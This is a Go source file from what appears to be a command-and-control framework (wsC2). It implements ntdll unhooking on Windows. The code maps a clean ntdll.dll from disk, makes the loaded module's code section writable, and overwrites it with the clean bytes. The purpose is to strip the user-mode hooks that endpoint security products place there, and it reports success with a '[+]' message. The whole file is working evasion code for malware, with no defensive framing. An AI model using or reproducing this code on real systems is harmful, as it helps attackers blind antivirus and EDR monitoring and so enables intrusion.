//go:build windows
// +build windows

package unhookntdll

import (
	"debug/pe"
	"syscall"
	"unsafe"

	"github.com/latortuga71/wsC2/pkg/winapi"
	"golang.org/x/sys/windows"
)

var SEC_IMAGE uint32 = 0x1000000

func Unhook(localNtdllAddress windows.Handle, cleanNtdllMapping uintptr) error {
	pe, err := pe.Open(`C:\\Windows\System32\ntdll.dll`)
	if err != nil {
		return err
	}
	imageSection := pe.Sections[0]
	offsetToTextSectionHooked := unsafe.Pointer(localNtdllAddress + windows.Handle(imageSection.VirtualAddress))
	offsetToTextSectionClean := unsafe.Pointer(cleanNtdllMapping + uintptr(imageSection.VirtualAddress))
	var oldProtect uint32
	err = windows.VirtualProtect(uintptr(offsetToTextSectionHooked), uintptr(imageSection.VirtualSize), 0x40, &oldProtect)
	if err != nil {
		return err
	}
	hCurrent, err := windows.GetCurrentProcess()
	cleanBytes := make([]byte, imageSection.VirtualSize)
	var nBytesWritten *uint32
	var nBytesRead *uint32
	readMem, err := winapi.ReadProcessMemory(
		syscall.Handle(hCurrent),
		uintptr(offsetToTextSectionClean),
		(uintptr)(unsafe.Pointer(&cleanBytes[0])),
		imageSection.VirtualSize,
		nBytesRead)
	if !readMem {
		return err
	}
	writeMem, err := winapi.WriteProcessMemory(
		syscall.Handle(hCurrent),
		uintptr(offsetToTextSectionHooked),
		(uintptr)(unsafe.Pointer(&cleanBytes[0])),
		imageSection.VirtualSize,
		nBytesWritten)
	if !writeMem {
		return err
	}
	err = windows.VirtualProtect(uintptr(offsetToTextSectionHooked), uintptr(imageSection.VirtualSize), uint32(oldProtect), &oldProtect)
	if err != nil {
		return err
	}
	return nil
}

func UnhookNtdll() (string, error) {
	hFile, err := windows.CreateFile(syscall.StringToUTF16Ptr("C:\\windows\\system32\\ntdll.dll"), windows.GENERIC_READ, 0, nil, windows.OPEN_EXISTING, 0, 0)
	if hFile == 0 {
		return "", err
	}
	sanil := &windows.SecurityAttributes{}
	flags := uint32(windows.PAGE_READONLY | 0x1000000)
	hMap, err := windows.CreateFileMapping(hFile, sanil, flags, 0, 0, nil)
	if hMap == 0 {
		windows.CloseHandle(hFile)
		return "", err
	}
	addr, err := windows.MapViewOfFile(hMap, windows.FILE_MAP_READ, 0, 0, 0)
	if err != nil {
		windows.CloseHandle(hFile)
		windows.CloseHandle(hMap)
		return "", err
	}
	if addr == 0 {
		windows.CloseHandle(hFile)
		windows.CloseHandle(hMap)
		return "", err
	}
	var localNtdllAddress windows.Handle
	err = windows.GetModuleHandleEx(0, syscall.StringToUTF16Ptr("ntdll.dll"), &localNtdllAddress)
	if err != nil {
		windows.CloseHandle(hFile)
		windows.CloseHandle(hMap)
		return "", err
	}
	windows.CloseHandle(hMap)
	windows.CloseHandle(hFile)
	err = Unhook(localNtdllAddress, addr)
	if err != nil {
		windows.CloseHandle(localNtdllAddress)
		windows.UnmapViewOfFile(addr)
		return "", err
	}
	err = windows.UnmapViewOfFile(addr)
	if err != nil {
		windows.CloseHandle(localNtdllAddress)
		return "", err
	}
	windows.CloseHandle(localNtdllAddress)
	return "[+] Successfully Unhooked enteedeeellell", nil
}
